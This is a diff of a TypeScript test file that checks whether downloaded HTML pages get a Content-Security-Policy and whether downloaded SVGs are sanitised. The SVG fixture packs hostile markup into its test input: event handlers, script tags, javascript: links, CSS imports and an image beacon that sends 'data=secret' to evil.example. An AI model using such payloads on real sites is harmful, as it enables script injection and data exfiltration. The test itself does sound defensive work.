@@ -1,48 +1,83 @@
 import { afterEach, describe, expect, it, vi } from "vitest";
 
-import { copySvgImage, downloadVisual, sealedPage } from "./visual-actions";
+import { copySvgImage, downloadVisual, inertSvg, sealedPage } from "./visual-actions";
+
+const BASE = "https://content.example.com/api/v1/artifact-content/";
+
+/** Download one visual and hand back the file the browser was given. */
+async function downloaded(kind: "svg" | "html" | "mermaid", content: string) {
+  vi.useFakeTimers();
+  const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
+  const created = vi.spyOn(URL, "createObjectURL").mockReturnValue("blob:x");
+  const revoked = vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
+  downloadVisual("Order flow", kind, content, BASE);
+  const blob = created.mock.calls[0]![0] as Blob;
+  const link = click.mock.contexts[0] as HTMLAnchorElement;
+  // Revoked only after the click handler returns: Firefox and Safari read the URL then.
+  expect(revoked).not.toHaveBeenCalled();
+  vi.runAllTimers();
+  expect(revoked).toHaveBeenCalledWith("blob:x");
+  vi.useRealTimers();
+  vi.restoreAllMocks();
+  return { blob, name: link.download, text: await blob.text() };
+}
 
 describe("downloadVisual", () => {
-  it("saves the drawing under a name made from its title", () => {
-    const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
-    const created = vi.spyOn(URL, "createObjectURL").mockReturnValue("blob:x");
-    const revoked = vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
-
-    downloadVisual("Order flow", "mermaid", "graph TD");
-
-    const blob = created.mock.calls[0]![0] as Blob;
-    expect(blob.type).toBe("text/plain;charset=utf-8");
-    const link = click.mock.contexts[0] as HTMLAnchorElement;
-    expect(link.download).toBe("order-flow.mmd");
-    expect(revoked).toHaveBeenCalledWith("blob:x");
-    click.mockRestore();
-    created.mockRestore();
-    revoked.mockRestore();
+  it("saves the drawing under a name made from its title", async () => {
+    const file = await downloaded("mermaid", "graph TD");
+    expect(file.blob.type).toBe("text/plain;charset=utf-8");
+    expect(file.name).toBe("order-flow.mmd");
+    expect(file.text).toBe("graph TD");
   });
 });
 
 describe("a downloaded page", () => {
-  it("carries the frame's rules inside it: no request anywhere", async () => {
-    const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
-    const created = vi.spyOn(URL, "createObjectURL").mockReturnValue("blob:x");
-    vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
-
-    downloadVisual("Report", "html", "<html><head><title>R</title></head><body></body></html>");
-
-    const saved = await (created.mock.calls[0]![0] as Blob).text();
-    expect(saved).toMatch(/^<html><head><meta http-equiv="Content-Security-Policy"/);
-    expect(saved).toContain("connect-src 'none'");
-    expect(saved).toContain(
-      `script-src 'unsafe-inline' 'unsafe-eval' data: blob: ${location.origin}`,
+  it("carries the frame's rules inside it, ahead of anything the page wrote", async () => {
+    const file = await downloaded(
+      "html",
+      '<img src="https://evil.example/x"><html><head><title>R</title></head><body></body></html>',
     );
-    click.mockRestore();
-    vi.restoreAllMocks();
+    expect(file.text).toMatch(/^<meta http-equiv="Content-Security-Policy"/);
+    expect(file.text).toContain("connect-src 'none'");
+    // The artifact origin the libraries come from, not the console's.
+    expect(file.text).toContain(
+      "script-src 'unsafe-inline' 'unsafe-eval' data: blob: https://content.example.com;",
+    );
   });
 
-  it("puts the policy first in a page with no head", () => {
-    expect(sealedPage("<p>hi</p>", "https://console.example")).toMatch(
-      /^<meta http-equiv="Content-Security-Policy" content="default-src 'none';.*"><p>hi<\/p>$/,
+  it("names its libraries where the frame serves them", () => {
+    const page = sealedPage(
+      '<script src="lib/chart-4.5.0.umd.min.js"></script><script type="importmap">{"imports":{"three":"lib/three.module.js"}}</script>',
+      BASE,
     );
+    expect(page).toContain(`src="${BASE}lib/chart-4.5.0.umd.min.js"`);
+    expect(page).toContain(`"three":"${BASE}lib/three.module.js"`);
+  });
+});
+
+describe("a downloaded SVG", () => {
+  it("keeps the drawing and nothing that runs or reaches out", async () => {
+    const file = await downloaded(
+      "svg",
+      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="steal()">' +
+        "<script>steal()</script>" +
+        "<style>@import url(https://evil.example/a.css); rect { fill: url(#g); background: url(https://evil.example/b) }</style>" +
+        '<a href="javascript:steal()"><rect width="2" height="1" onclick="steal()"/></a>' +
+        '<image href="https://evil.example/pixel?data=secret"/>' +
+        '<use xlink:href="#shape"/>' +
+        '<animate attributeName="href" to="javascript:steal()"/>' +
+        '<foreignObject><iframe src="https://evil.example"/></foreignObject>' +
+        "</svg>",
+    );
+    expect(file.blob.type).toBe("image/svg+xml;charset=utf-8");
+    expect(file.text).not.toMatch(/steal|evil\.example|<script|<iframe|<animate/);
+    expect(file.text).toContain("<rect");
+    expect(file.text).toContain('xlink:href="#shape"');
+    expect(file.text).toContain("url(#g)");
+  });
+
+  it("saves nothing for an SVG the browser could not parse", () => {
+    expect(inertSvg("<svg><unclosed></svg>")).toBe("");
   });
 });
 
